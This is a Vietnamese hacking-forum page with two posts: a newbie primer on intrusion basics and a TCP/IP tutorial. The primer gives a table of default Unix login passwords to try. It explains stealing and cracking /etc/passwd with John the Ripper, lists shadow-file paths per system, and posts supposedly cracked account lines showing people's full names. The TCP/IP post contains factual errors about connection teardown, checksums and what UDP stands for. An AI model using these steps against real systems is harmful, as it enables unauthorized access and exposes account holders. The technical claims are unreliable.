	
					
        <tr>		
          <td class="postInfo">
			<table width="100%">				
              <tr>								
                <td align="left" >
				<span class="topmenu"><a href="/hvaonline/forums/show/12.html">Thảo luận thâm nhập</a></span>
				<span class="topmenu"><img src="/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/list/131.html">Empty</a></span>
				<span class="topmenu"><img src="/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/preList/131/487.html#487,">Go to message</a></span>
              </tr>
			</table>
			</td>
        </tr>

        <tr>
        <!-- Message -->
          	<td class="row1" valign="top">
			<span class="postbody"><font size='+3'><b>PHẦN I </b></font><br/><br/> (Hiện tại có 9 phần, bạn nào thấy thiếu thì bổ sung thêm nhé )<br/> <i><b>Tác giả: (ANHDENDAY)???</b></i><br/><br/> Tự bạch : Nhiều bạn Newbie có hỏi tôi “ Hack là như thế nào ? Làm sao để hack ?” Nhưng các bạn đã quên mất một điều là các bạn cần phảI có kiến thức một cách tổng quát , hiểu các thuật ngữ mà những người rành về mạng hay sử dụng . Riêng tôi thì chưa thật giỏi bao nhiêu nhưng qua nghiên cứu tôi cũng đã tổng hợp được một số kiến thức cơ bản , muốn chia sẻ cho tất cả các bạn , nhằm cùng các bạn học hỏi . Tôi sẽ không chịu trách nhiệm nếu các bạn dùng nó để quậy phá ngườI khác . Các bạn có thể copy hoặc post trong các trang Web khác nhưng hãy điền tiên tác giả ở dướI bài , tôn trọng bài viết này cũng chính là tôn trọng tôi và công sức của tôi , đồng thờI cũng tôn trọng chính bản thân các bạn . Trong này tôi cũng có chèn thêm một số cách hack , crack và ví dụ căn bản , các bạn có thể ứng dụng thử và nghiên cứu đọc nó để hiểu thêm , rồ khi bắt gặp một từ mà các bạn không hiểu thì hãy đọc bài này để biết , trong này tôi có sử dụng một số ý của bài viết mà tôi thấy rất hay từ trang Web của HVA , và các trang Web khác mà tôi đã từng ghé thăm . Xin cảm ơn những tác giả đã viết những bài ấy . Bây giờ là vấn đề chính .<br/><br/> ===========================================<br/> <b>1 . ) Ta cần những gì để bắt đầu ?</b><br/><br/> Có thể nhiều bạn không đồng ý với tôi nhưng cách tốt nhất để thực tập là các bạn hãy dùng HĐH Window 9X , rồI đến các cái khác mạnh hơn đó là Linux hoặc Unix , dướI đây là những cái bạn cần có :<br/> + Một cái OS ( có thể là DOS , Window 9X , Linux , Unit ….)<br/> + Một cái trang Web tốt ( HVA chẳng hạn hi`hi` )<br/> + Một bộ trình duyệt mạng tốt ( là Nescape , IE , nhưng tốt nhất có lẽ là Gozzila )<br/> + Một công cụ chat tốt ( mIRC ,Yahoo Mass …..)<br/> + Telnet ( hoặc những cái tương tự như nmap …)<br/> + Cái quan trọng nhất mà bất cứ ai muốn trở thành một hacker là đều phảI có một chút kiến thức về lập trình ( C , C++ , Visual Basic , Pert …..)<br/><br/> <b>2 . ) Thế nào là một địa chỉ IP ?</b><br/><br/> _ Địa chỉ IP được chia thành 4 số giới hạn từ 0 - 255. Mỗi số được lưu bởi 1 byte -&gt; !P có kicks thước là 4byte, được chia thành các lớp địa chỉ. Có 3 lớp là A, B, và C. Nếu ở lớp A, ta sẽ có thể có 16 triệu điạ chỉ, ở lớp B có 65536 địa chỉ. Ví dụ: Ở lớp B với 132.25,chúng ta có tất cả các địa chỉ từ 132.25.0.0 đến 132.25.255.255. Phần lớn các địa chỉ ở lớp A llà sở hữu của các công ty hay của tổ chức. Một ISP thường sở hữu một vài địa chỉ lớp B hoặc C. Ví dụ: Nếu địa chỉ IP của bạn là 132.25.23.24 thì bạn có thể xác định ISP của bạn là ai. ( có IP là 132.25.x.)<br/> _ IP là từ viết tắt của Internet Protocol, trên Internet thì địa chỉ IP của mỗI người là duy nhất và nó sẽ đạI diện cho chính ngườI đó, địa chỉ IP được sử dụng bởi các máy tính khác nhau để nhận biết các máy tính kết nối giữa chúng. Đây là lí do tại sao bạn lại bị IRC cấm, và là cách người ta tìm ra IP của bạn.<br/> Địa chỉ IP có thể dễ dàng phát hiện ra, người ta có thể lấy được qua các cách sau :<br/> + bạn lướt qua một trang web, IP của bạn bị ghi lại<br/> + trên IRC, bất kì ai cũng có thể có IP của bạn<br/> + trên ICQ, mọi người có thể biết IP của bạn, thậm chí bạn chọn "do not show ip" người ta vẫn lấy được nó<br/> + nếu bạn kết nối với một ai đó, họ có thế gõ "systat –n ", và biết được ai đang kết nối đên họ<br/> + nếu ai đó gửi cho bạn một email với một đoạn mã java tóm IP, họ cũng có thể tóm được IP của bạn<br/> ( Tài liệu của HVA )<br/><br/> <b>3 . ) Làm thế nào để biết được địa chỉ IP của mình ?</b><br/><br/> Run_ Trong Window : vào Start đánh lệnh “winipcfg” .<br/> _ Trong mIRC : kết nốI đến máy chủ sau đó đánh lệnh “/dns &lt;your nick&gt;”<br/> _ Thông qua một số trang Web có hiển thị IP .<br/><br/> <b>4 . ) IP Spoofing là gì ?</b><br/><br/> _ Một số IP có mục đích để xác định một thiết bị duy nhất trên thế giới. Vì vậy trên mạng một máy chủ có thể cho phép một thiết bị khác trao đổi dữ liệu qua lại mà không cần kiểm tra máy chủ.<br/> Tuy nhiên có thể thay đổi IP của bạn, nghĩa là bạn có thể gởi một thông tin giả đến một máy khác mà máy đó sẽ tin rằng thông tin nhận được xuất phát từ một máy nào đó (tất nhiên là không phải máy của bạn). Bạn có thể vượt qua máy chủ mà không cần phải có quyền điều khiến máy chủ đó. Điều trở ngại là ở chỗ những thông tin phản hồi từ máy chủ sẽ được gởi đến thiết bị có IP mà chúng ta đã giả mạo. Vì vậy có thể bạn sẽ không có được sự phản hồi những thông tin mà mình mong muốn. Có lẽ điều duy nhất mà spoof IP có hiệu quả là khi bạn cần vượt qua firewall, trộm account và cần dấu thông tin cá nhân!<br/> ( Tài liệu của HVA )<br/><br/> <b>5 . ) Trojan / worm / virus / logicbomb là cái gì ?</b><br/><br/> _ Trojan : Nói cho dễ hiểu thì đây là chương trình điệp viên được cài vào máy của ngườI khác để ăn cắp nhũng tài liệu trên máy đó gửI về cho chủ nhân của nó , Cái mà nó ăn cắp có thể là mật khẩu , accourt , hay cookie ………. tuỳ theo ý muốn của ngườI cài nó .<br/> _ virus : Nói cho dễ hiểu thì đây là chương trình vớI những mã đặc biệt được cài ( hoặc lây lan từ máy khác ) lên máy của nạn nhân và thực hiện những yêu cầu của mã đó , đa số virut được sử dụng để phá hoạI dữ liệu hoặc phá hoạI máy tính .<br/> _ worm : Đây là chương trình độc lập có thể tự nhân bản bản thân nó và lây lan khắp bên trong mạng .Cũng giống như Virut , nó cũng có thể phá hoạI dữ liệu , hoặc nó có thể phá hoạI bên trong mạng , nhiều khi còn làm down cả mang đó .<br/> _ logicbomb : Là chương trình gửi một lúc nhiều gói dữ liệu cho cùng một địa chỉ , làm ngập lụt hệ thống , tắt nghẽn đường truyền ( trên server ) hoặc dùng làm công cụ để “khủng bố” đối phương ( bom Mail ) <img src="/hvaonline/images/smilies/068ae40523a24c9ef54edefd375e542d.gif" border="0" alt="smilie" align="absbottom"> .<br/><br/> <b>6 . ) PGP là gì ?</b><br/><br/> _ PGP là viết tắt của từ “Pretty Good Privacy” , đây là công cụ sử dụng sự mã hoá chìa khoá công cộng để bảo vệ những hồ sơ Email và dữ liệu , là dạng mã hoá an toàn cao sử dụng phần mềm cho MS_DOS , Unix , VAX/VMS và cho những dạng khác .<br/><br/> <b>7 . ) Proxy là gì ?</b><br/><br/> _Proxy cung cấp cho người sử dụng truy xuất internet với những host đơn. Những proxy server phục vụ những nghi thức đặt biệt hoặc một tập những nghi thức thực thi trên dual_homed host hoặc basion host. Những chương trình client của người sử dung sẽ qua trung gian proxy server thay thế cho server thật sự mà người sử dụng cần giao tiếp. Proxy server xác định những yêu cầu từ client và quyết định đáp ứng hay không đáp ứng, nếu yêu cầu được đáp ứng, proxy server sẽ kết nối với server thật thay cho client và tiếp tục chuyển tiếp đến những yêu cầu từ clientđến server, cũng như đáp ứng những yêu cầu của server đến client. Vì vậy proxy server giống cầu nối trung gian giữa server và client .<br/> _ Proxy cho user truy xuất dịch vụ trên internet theo nghĩa trực tiếp. Với dual host homed cần phải login vào host trước khi sử dụng dịch vụ nào trên internet. Điều này thường không tiện lợi, và một số người trể nên thất vọng khi họ có cảm giác thông qua firewall, với proxy nó giải quyết được vấn đề này. Tất nhiên nó còn có những giao thức mới nhưng nói chung nó cũng khá tiện lợi cho user. Bởi vì proxy cho phép user truy xuất những dịch vụ trên internet từ hệ thống cá nhân của họ, vì vậy nó không cho phép packet đi trực tiếp giữa hệ thống sử dụng và internet. đường đi là giáng tiếp thông qua dual homed host hoặc thông qua sự kết hợp giữa bastion host và screening rounter.<br/><br/> ( Bài viết của Z3RON3 – tài liệu của HVA )<br/><br/> <b>8 . ) Unix là gì ?</b><br/> _ Unix là một hệ điều hành ( giống Window ) .Nó hiện là hệ điều hành mạnh nhất , và thân thiết với các Hacker nhất . Nếu bạn đã trở thành một hacker thật sự thì HĐH này không thể thiếu đối vớI bạn . Nó được sử dụng hỗ trợ cho lập trình ngôn ngữ C .<br/><br/> <b>9 . ) Telnet là gì ?</b><br/> _ Telnet là một chương trình cho phép ta kết nốI đến máy khác thông qua cổng ( port ) . MọI máy tính hoặc máy chủ ( server ) đều có cổng , sau đây là một số cổng thông dụng :<br/> + Port 21: FTP<br/> + Port 23: Telnet<br/> + Port 25: SMTP (Mail)<br/> + Port 37: Time<br/> + Port 43: Whois<br/> _ Ví dụ : bạn có thể gọI Telnet để kết nốI đến mail.virgin.net trên port 25 .<br/><br/> <b>10 . ) Làm thế nào để biết mình đã Telnet đến hệ thống Unix ?</b><br/><br/> _ Ok , tôi sẽ nói cho bạn biết làm sao một hệ thống Unix có thể chào hỏI bạn khi bạn kết nối tới nó . Đầu tiên , khi bạn gọi Unix , thông thường nó sẽ xuất hiện một dấu nhắc : “ Log in : ” , ( tuy nhiên , chỉ với như vậy thì cũng chưa chắc chắn đây là Unix được ngoạI trừ chúng xuất hiện thông báo ở trước chữ “ log in :” như ví dụ : Welcome to SHUnix. Please log in ….)<br/> Bây giờ ta đang ở tạI dấu nhắc “log in” , bạn cần phảI nhập vào một account hợp lệ . Một account thông thường gồm có 8 đặc tính hoặc hơn , sau khi bạn nhập account vào , bạn sẽ thấy có một mật khẩu , bạn hãy thử nhập Default Password thử theo bảng sau :<br/><br/> Account-------------------------Default Password<br/><br/><br/> Root-----------------------------------------------Root<br/> Sys------------------------------------------------Sys / System / Bin<br/> Bin-------------------------------------------------Sys / Bin<br/> Mountfsy------------------------------------------Mountfsys<br/> Nuuc-----------------------------------------------Anon<br/> Anon-----------------------------------------------Anon<br/> User------------------------------------------------User<br/> Games---------------------------------------------Games<br/> Install----------------------------------------------Install<br/> Demo-----------------------------------------------Demo<br/> Guest----------------------------------------------Guest<br/><br/><br/> <b>11 . ) shell account là cái gì ?</b><br/><br/> _ Một shell account cho phép bạn sử dụng máy tính ở nhà bạn như thiết bị đầu cuốI ( terminal ) mà vớI nó bạn có thể đánh lệnh đến một máy tính đang chạy Unix , “Shell” là chương trình có nhiệm vụ dịch những ký tự của bạn gửi đến rồI đưa vào thực hiện lệnh của chương trình Unix . VớI một shell account chính xác bạn có thể sử dụng được một trạm làm việc mạnh hơn nhiều so vớI cái mà bạn có thể tưởng tượng đến được .<br/> Bạn có thể lấy được “shell account” miễn phí tạI trang Web www.freeshell.com tuy nhiên bạn sẽ không sử dụng được “telnet” cho đến khi bạn trả tiền cho nó .<br/><br/> <b>12 . ) Làm cách nào để bạn có thể crack Unix account passwords ?</b><br/><br/> _ Rất đơn giản , tuy nhiên cách mà tôi nói vớI các bạn ở đây “lạc hậu” rồI , các bạn có thể crack được chúng nếu các bạn may mắn , còn không thì các bạn đọc để tham khảo .<br/> _ Đầu tiên bạn hãy đăng nhập vào hệ thống có sử dụng Unix như một khách hàng hoặc một ngườI khách ghé thăm , nếu may mắn bạn sẽ lấy được mật khẩu được cất dấu trong những hệ thống chuẩn như :<br/><br/> /etc/passwd<br/><br/> mỗi hàng trong một hồ sơ passwd có một tài khoản khác nhau , nó giống như hàng này :<br/><br/> userid:password:userid#:groupid#:GECOS field:home dir:shell<br/><br/> trong đó :<br/> + userid = the user id name : tên đăng nhập : có thể là một tên hoặc một số .<br/> + password : mật mã . Dùng để làm gì hẳn các bạn cũng biết rồI .<br/> + userid# : là một số duy nhất đựơc thông báo cho ngườI đăng ký khi họ đăng ký mớI ở lần đầu tiên .<br/> + groupid# : tương tự như userid# , nhưng nó được dùng cho những ngườI đang ở trong nhóm nào đó ( như nhóm Hunter Buq của HVA chẳng hạn )<br/> + GECOS FIELD : đây là nơi chứa thông tin cho ngườI sử dụng , trong đó có họ tên đầy đủ , số điện thoại , địa chỉ v.v…. . Đây cũng là nguồn tốt để ta dễ dàng crack một mật khẩu .<br/> + home dir : là thư mục ghi lạI hoạt động của người khách khi họ ghé thăm ( giống như mục History trong IE vậy )<br/> + Shell : đây là tên của shell mà nó tự động bắt đầu khi ta login .<br/> _ Hãy lấy file password , lấy file text đã mã hoá về , sau đó bạn dùng chương trình "CrackerJack" hoặc "John the Ripper" để crack .<br/> _ Các bạn thấy cũng khá dễ phảI không ? Sai bét , không dễ dàng và may mắn để bạn có thể crack được vì hầu hết bây giờ họ cất rất kỹ , hãy đọc tiếp bạn sẽ thấy khó khăn chỗ nào .<br/><br/> <b>13 . ) shadowed password là cái gì ?</b><br/><br/> _ Một shadowed password được biết đến là trong file Unix passwd , khi bạn nhập một mật khẩu , thì ngườI khác chỉ thấy được trình đơn của nó ( như ký hiệu “ X ” hoặc “ * ” ) . Cái này thông báo cho bạn biết là file passwd đã được cất giữ ở nơi khác , nơi mà một ngườI sử dụng bình thường không thể đến được . Không lẽ ta đành bó tay , dĩ nhiên là đốI vớI một hacker thì không rùi , ta không đến được trực tiếp file shadowed password thì ta hãy tìm file sao lưu của nó , đó là file Unshadowed .<br/> Những file này trên hệ thống của Unix không cố định , bạn hãy thử vớI lần lượt những đường dẫn sau :<br/><br/><br/> <blockquote>CODE<br/> AIX 3 /etc/security/passwd !<br/> or /tcb/auth/files/&lt;first letter #of username&gt;/&lt;username&gt;<br/> A/UX 3.0s /tcb/files/auth/?/ *<br/> BSD4.3-Reno /etc/master.passwd *<br/> ConvexOS 10 /etc/shadpw *<br/> ConvexOS 11 /etc/shadow *<br/> DG/UX /etc/tcb/aa/user/ *<br/> EP/IX /etc/shadow x<br/> HP-UX /.secure/etc/passwd *<br/> IRIX 5 /etc/shadow x<br/> Linux 1.1 /etc/shadow *<br/> OSF/1 /etc/passwd[.dir|.pag] *<br/> SCO Unix #.2.x /tcb/auth/files/&lt;first letter *of username&gt;/&lt;username&gt;<br/> SunOS4.1+c2 /etc/security/passwd.adjunct =##username<br/> SunOS 5.0 /etc/shadow<br/> &lt;optional NIS+ private secure<br/> maps/tables/whatever&gt;<br/> System V Release 4.0 /etc/shadow x<br/> System V Release 4.2 /etc/security/* database<br/> Ultrix 4 /etc/auth[.dir|.pag] *<br/> UNICOS /etc/udb =20&nbsp;
</blockquote><br/><br/> Trước dấu “ / ”đầu tiên của một hàng là tên của hệ thống tương ứng , hãy căn cứ vào hệ thông thật sự bạn muốn lấy rồI lần theo đường dẫn phía sau dấu “/”đầu tiên .<br/> Và cuốI cùng là những account passwd mà tôi từng crack được , có thể bây giờ nó đã hết hiệu lực rồI :<br/><br/><br/> <blockquote>CODE<br/> arif<img src="/hvaonline/images/smilies/40af9ca5d4af4f53bc05e0396f2436f0.gif" border="0" alt="smilie" align="absbottom">:1569:1000:Nguyen Anh Chau:/udd/arif:/bin/ksh<br/> arigo<img src="/hvaonline/images/smilies/40af9ca5d4af4f53bc05e0396f2436f0.gif" border="0" alt="smilie" align="absbottom">:1570:1000:Ryan Randolph:/udd/arigo:/bin/ksh<br/> aristo<img src="/hvaonline/images/smilies/40af9ca5d4af4f53bc05e0396f2436f0.gif" border="0" alt="smilie" align="absbottom">:1573:1000:To Minh Phuong:/udd/aristo:/bin/ksh<br/> armando<img src="/hvaonline/images/smilies/40af9ca5d4af4f53bc05e0396f2436f0.gif" border="0" alt="smilie" align="absbottom">:1577:1000:Armando Huis:/udd/armando:/bin/ksh<br/> arn<img src="/hvaonline/images/smilies/40af9ca5d4af4f53bc05e0396f2436f0.gif" border="0" alt="smilie" align="absbottom">:1582:1000:Arn mett:/udd/arn:/bin/ksh<br/> arne<img src="/hvaonline/images/smilies/40af9ca5d4af4f53bc05e0396f2436f0.gif" border="0" alt="smilie" align="absbottom">:1583:1000<img src="/hvaonline/images/smilies/575eda61e93c7ad9d05928580213fd9b.gif" border="0" alt="smilie" align="absbottom">ham Quoc Tuan:/udd/arne:/bin/ksh<br/> aroon<img src="/hvaonline/images/smilies/40af9ca5d4af4f53bc05e0396f2436f0.gif" border="0" alt="smilie" align="absbottom">:1585:1000:Aroon Thakral:/udd/aroon:/bin/ksh<br/> arozine<img src="/hvaonline/images/smilies/40af9ca5d4af4f53bc05e0396f2436f0.gif" border="0" alt="smilie" align="absbottom">:1586:1000: Mogielnicki:/udd/arozine:/bin/bash<br/> arranw<img src="/hvaonline/images/smilies/40af9ca5d4af4f53bc05e0396f2436f0.gif" border="0" alt="smilie" align="absbottom">:1588:1000:Arran Whitaker:/udd/arranw:/bin/ksh&nbsp;
</blockquote><br/><br/> Để bảo đảm sự bí mật nên pass của họ tôi xoá đi và để vào đó là ký hiệu “ x ” , các bạn hãy tìm hiểu thông tin có được từ chúng xem .<br/><br/> ( Hết phần 1 )<br/><br/> Còn rất nhiều định nghĩa cũng như thủ thuật hack và crack khác tôi muốn cùng chia sẻ vớI các bạn , đặc biệt là các bạn Newbie . Tôi sẽ lần lượt post lên trong thời gian tới , mong được sự đóng góp ý kiến của các bạn để những phần sau được viết hay hơn .<br/> Hãy nhớ , hack cũng là một nghệ thuật và rất cần sự ham thích học hỏi cũng như sự kiên trì của các bạn . Sẽ có ngày các bạn cũng sẽ giỏI thôi . Chúc các bạn vui vẻ .<br/><br/> ************************************************************<br/> </span>
				
        <!-- Attachments -->
			</td>
        </tr>
		
					
        <tr>		
          <td class="spacerow" height="1"><img src="/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="1" /></td>
        </tr>
	
					
        <tr>		
          <td class="postInfo">
			<table width="100%">				
              <tr>								
                <td align="left" >
				<span class="topmenu"><a href="/hvaonline/forums/show/31.html">Thảo luận mạng và thiết bị mạng</a></span>
				<span class="topmenu"><img src="/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/list/130.html">Empty</a></span>
				<span class="topmenu"><img src="/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/preList/130/486.html#486,">Go to message</a></span>
              </tr>
			</table>
			</td>
        </tr>

        <tr>
        <!-- Message -->
          	<td class="row2" valign="top">
			<span class="postbody"><br/> <font size='+3'><b>Tìm hiểu TCP</b></font><br/><br/> Tìm hiểu về TCP/IP :<br/><br/> Đây là bài viết của NNTSOFT aka You-Know-Who trong ourviet. Tôi chỉ có nhiệm vụ là decode mine-encode file ra và post nó lên đây. Hy vọng là tác giả không phàn nàn. Xin thành thật cảm ơn tác giả.<br/> ---------<br/><br/> TCP/IP<br/><br/> TCP/IP gồm 4 lớp giao thức, tương ứng với 7 lớp giao thức của chuẩn ISO OSI. Bốn lớp đó gồm (kể theo thứ tự từ trên xuống dưới): Application layer, Host-to-host layer, Internet layer, cuối cùng là Physical layer. TCP nằm ở lớp thứ 3 (Host-to-host layer), IP nằm ở lớp thứ 2 (Internet layer).<br/><br/> Tên Số thứ tự<br/> Application layer 4<br/> Host-to-host layer 3<br/> Internet layer 2<br/> Physical layer 1<br/><br/> Đi từ trên xuống dưới, lớp ứng dụng sẽ xử lý thông tin và ra lệnh gửi/nhận đến lớp TCP để truyền và nhận dữ liệu.<br/><br/> TCP là viết tắt của Transmission Control Protocol tạm dịch là Cách thức điều khiển truyền. TCP phụ trách việc truyền và nhận dữ liệu. TCP giúp cho lớp ứng dụng (Application layer) sử dụng lớp IP (lớp IP là vì lớp Internet chỉ có IP) (Internet Protocol, tạm dịch Giao thức liên mạng) một cách trong suốt. Điều này có nghĩa là lớp ứng dụng không cần biết đến phần cứng sẽ làm việc gì, ra sao, mà chỉ cần quan tâm đến việc xử lý dữ liệu của riêng mình. TCP cũng đảm trách việc nhận đúng dữ liệu và gửi dữ liệu đó đến đúng chương trình cần nhận. TCP còn có chức năng kiểm tra và sửa lỗi thông qua việc đồng bộ hoá (synchronize) thông tin 2 đầu truyền dữ liệu và lời nhận biết (acknowledgement) từ phía nhận dữ liệu.<br/><br/> Lớp IP đảm trách việc tìm đường tối ưu để gửi dữ liệu qua mạng và đưa dữ liệu xuống cho lớp vật lý (Physical layer).<br/><br/> Lớp vật lý chính thức chuyển dữ liệu thành các bit và truyền dữ liệu vào cáp (cable).<br/> Khi dữ liệu đến thì lớp vật lý nhận dữ liệu, gộp lại thành các bit, byte và chuyển lại cho lớp IP. Đến lượt lớp IP sau khi đã kiểm tra dữ liệu là thuộc về giao thức TCP sẽ trả dữ liệu đó cho lớp TCP (lưu ý, tôi dùng từ "lớp TCP" để chỉ đến giao thức TCP, TCP/IP không có "lớp TCP" mà là "Host-to-host layer", bao gồm TCP và UDP. UDP sẽ được nói ở phần cuối bài).<br/><br/> Nguyên tắc hoạt động:<br/> Mục này giới thiệu cách thức hoạt động của lớp TCP và lớp IP.<br/><br/> Các tính chất của TCP:<br/><br/> - Có tính kết nối (connection oriented) với giao tiếp 3 lượt (3-way handshake).<br/> - Phát hiện và sửa lỗi (error detection & recovery).<br/><br/> TCP là một giao thức có tính kết nối. Điều này có nghĩa là mọi kết nối đều có sự thông tin trước. Ví dụ A muốn kết nối tới B thì A phải thong báo cho B biết trước và đợi trả lời đồng ý từ B. Sự thông tin này diễn ra theo 3 bước (3-way handshake) như sau:<br/><br/> 1. A gửi thông điệp muốn kết nối tới B. (SYN)<br/> 2. B gửi thông điệp đồng ý kết nối lại cho A. (ACK, SYN)<br/> 3. A gửi thông điệp đã nhận được sự đồng ý lại cho B. (ACK)<br/><br/> SYN: synchronize, đồng bộ hoá kết nối.<br/> ACK: acknowledgement, sự nhận biết.<br/><br/> Diễn giải quá trình:<br/><br/> Bước 1: A gửi một SYN message tới B, thông báo cổng (port) cần kết nối tới, dung lượng đường truyền của A, khả năng gửi bao nhiêu thông điệp không cần nhận biết (windowing, giải thích sau), và các thông tin khác.<br/><br/> Bước 2: B nhận được thông tin từ A, nếu chấp nhận kết nối sẽ gửi trả thông báo đã nhận được yêu cầu kết nối từ A và chấp nhận sự kết nối, đồng thời cũng gửi thêm thông tin về B như khả năng gửi bao nhiêu thông điệp không cần nhận biết v.v...<br/><br/> Bước 3: A gửi trả ACK message cho B thông báo rằng A đã nhận được. Kết nối thành công.<br/> Ngoài ra, khi muốn chấm dứt kết nối, bốn bước sau sẽ được thực hiện:<br/><br/> 1. A gửi tín hiệu chấm dứt kết nối. (SYN)<br/> 2. B nhận tín hiệu và gửi trả tín hiệu cho biết đã nhận. (ACK)<br/> 3. B gửi tín hiệu cho Application layer thông báo kết nối sẽ bị chấm dứt đồng thời gửi trả cho A tín hiệu thông báo đồng ý chấm dứt. (SYN)<br/> 4. A gửi lại cho B tín hiệu cho biết A đã nhận được thông điệp từ B. (ACK)<br/> Nói tóm lại, TCP có tính kết nối.<br/><br/> TCP có tính phát hiện lỗi vì mọi thông điệp gửi theo TCP đều được kiểm tra thông qua một số nguyên 32 bit cho biết giá trị CRC (Cyclic Redundant Check) của thông điệp được gửi. Bên gửi sẽ tính giá trị CRC và gửi kèm trong thông điệp. Bên nhận sẽ tính lại giá trị đó và so sánh với giá trị do bên gửi gửi đi. Nếu không đúng có nghĩa là đã có sự sai sót xảy ra. TCP có tính sửa lỗi vì khi phát hiện ra sai sót, bên nhận sẽ gửi thông điệp báo sai tới bên gửi, đề nghị gửi lại thông điệp bị sai.<br/><br/> Không phải sau mỗi một thông điệp được gửi đi thì đều có một thông điệp thông báo đã nhận được từ bên nhận gửi trả về. Có thể sau 10 thông điệp được gửi đi thì mới có một thông điệp thông báo nhận được gửi trả. Đó gọi là khả năng gửi không cần nhận biết.<br/> Ví dụ: A gửi cho B 6 lượt, mỗi lượt 1000 bytes, khả năng gửi không cần nhận biết của A là 3, B nhận được thông điệp đầu hoàn chỉnh, thông điệp thứ 2 bị sai, các thông điệp sau bình thường. Quá trình đó sẽ diễn ra như sau:<br/> 1. A gửi cho B 3 thông điệp lần lượt.<br/> 2. B gửi lại cho A ACK message với giá trị 2000. Nếu B nhận được tất cả các thông điệp hoàn chỉnh, B sẽ gửi lại cho A một ACK message với giá trị 4000 (là giá trị kế tiếp mà A có thể gửi).<br/> 3. A gửi lại cho B message thứ 2 (từ vị trí 2000 đến vị trí 2999) và chờ. Lúc này A hy vọng rằng B nhận được thông điệp thứ nhất và thông điệp thứ ba hoàn chỉnh, A sẽ không phải gửi lại toàn bộ các thông điệp từ chỗ bị sai mà chỉ gửi thông điệp bị sai.<br/> 4. B gửi lại cho A ACK message với giá trị 4000 cho biết B nhận được 3 thông điệp đầu hoàn chỉnh và A có thể gửi tiếp các thông điệp sau, bắt đầu từ vị trí 4000.<br/> 5. A gửi cho B thông điệp thứ 4, 5 và 6.<br/> 6. B gửi trả ACK message với giá trị 7000.<br/> Giả sử trong khi gửi thông điệp 4, 5, 6, A chưa kịp gửi thông điệp thứ 5 thì đã nhận được ACK message từ B với giá trị 5000 thì lúc đó window của A sẽ được sửa thành giá trị 3. Nếu A đã gửi thông điệp 4, 5 và nhận được ACK message của B với giá trị 5000 thì window của A được sửa thành 2, A có thể gửi tiếp 2 thông điệp 6 và 7. Có nghĩa là tối đa A có thể gửi ‘window’ lần số thông điệp. Mỗi lần gửi, giá trị window giảm cho đến khi bằng 0. Khi nhận được ACK message, giá trị đó sẽ thay đổi, tăng lên cho đến khi số thông điệp đã gửi đi mà chưa nhận được ACK message bằng giá trị window chính).<br/><br/> Trong quá trình truyền tín hiệu như vậy, nếu bên B cảm thấy có thể nhận được tín hiệu nhanh hơn thì bên B sẽ gửi SYN message lại cho A, thông báo muốn tăng giá trị window lên (giảm thời gian và số ACK message được gửi đi). Bên A sẽ gửi trả ACK message và tự tăng giá trị window lên theo yêu cầu của bên B. Ngược lại, B sẽ đề nghị A giảm giá trị window xuống. Ngoài ra, số lượng thông tin được gửi đi trong mỗi thông điệp cũng có thể thay đổi tuỳ vào đường truyền. Với TCP, lượng thông tin này được đo bằng đơn vị byte. MTU (maximum transmission unit) là số transmission unit (đơn vị truyền) (với TCP được tính là byte) tối đa mỗi thông điệp có thể chứa. Nói tóm lại, sự liên lạc bằng TCP có tính phát hiện và sửa lỗi, cũng như có sự can thiệp một cách tự động của lớp TCP phụ thuộc vào điều kiện đường truyền.<br/><br/> TCP phân biệt các thông điệp gửi cho chương trình này và thông điệp gửi cho chương trình khác thông qua socket. Socket là một khái niệm để chỉ 2 giá trị cần thiết khi khởi tạo kết nối. Đó là địa chỉ IP (IP address) của máy và cổng (port). Giả sử B chạy một server, nhận kết nối ở cổng 80, có địa chỉ IP là 1.1.1.1. A là máy khách, chạy 2 chương trình client để kết nối tới B, A có địa chỉ là 1.1.1.2. Client đầu tiên dùng port 1024, client thứ 2 dùng port 1025. Khi B nhận tín hiệu kết nối từ client thứ 1, B hiểu rằng tín hiệu đó từ địa chỉ IP 1.1.1.2 và từ port 1024. Tương tự, B hiểu client thứ 2 từ socket khác. Như vậy, khi B trả lời A, B sẽ gửi thông tin tới socket tương ứng với client 1 hay 2 của A. Khi A gửi cho B, B cũng biết thông tin đó từ client 1 hay 2 gửi cho mình thông qua việc nhận biết thông tin đó xuất phát từ socket của client 1 hay 2. Quá trình chuyển thông tin cho lớp ứng dụng này được gọi là multiplexing.<br/><br/> Nói thêm về UDP. UDP là một giao thức truyền khác, cũng nằm ở lớp thứ 3 (Host-to-host layer), cũng làm nhiệm vụ như TCP. UDP khác TCP ở chỗ là một giao thức không có tính kết nối, không có sự kiểm tra và sửa lỗi. UDP dựa vào lớp trên (lớp ứng dụng) để làm việc này. UDP viết tắt của Unreliable Datagram Protocol (tạm dịch giao thức truyền không đáng tin). Chương trình sử dụng UDP phải tự cài đặt phần kiểm tra dữ liệu. Tuy nhiên, điểm mạnh của UDP là ở chỗ vì không có nhiều tính toán và các thông tin kiểm tra khác nên UDP nhanh hơn TCP, sử dụng ít bộ nhớ cũng như thời gian của CPU hơn. UDP cũng dùng địa chỉ IP và port để nhận biết và chuyển thông tin cho lớp trên.<br/><br/> IP có chức năng chuyển thông tin đi qua mạng đến nơi cuối. IP làm được việc này nhờ vào một bảng chỉ đường (routing table) dựa trên địa chỉ mạng (network address), không phải dựa trên địa chỉ máy tới) và chuyển thông tin đó tới máy cuối. Trên đường đi, thông tin có thể qua nhiều trạm trung gian (tài liệu cũ dùng từ gateway, tài liệu mới dùng từ router), cũng sử dụng lớp IP để chuyển tiếp (forward) các tín hiệu đó tới các trạm khác gần máy đích hơn.<br/><br/> Cách tính địa chỉ mạng, địa chỉ máy (host address), địa chỉ mạng con (subnet address) và các vấn đề liên quan đến việc đánh địa chỉ sẽ được trình bày trong bài khác.<br/><br/> Tài liệu tham khảo:<br/> - Internetworking with TCP/IP volume I<br/> - TCP/IP illustrated volume I<br/> - Sybex CCNA Study Guide v2.0<br/> </span>
				
        <!-- Attachments -->
			</td>
        </tr>
		
					
        <tr>		
          <td class="spacerow" height="1"><img src="/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="1" /></td>
        </tr>
	
					
        <tr>		
          <td class="postInfo">
			<table width="100%">				
              <tr>								
                <td align="left" >
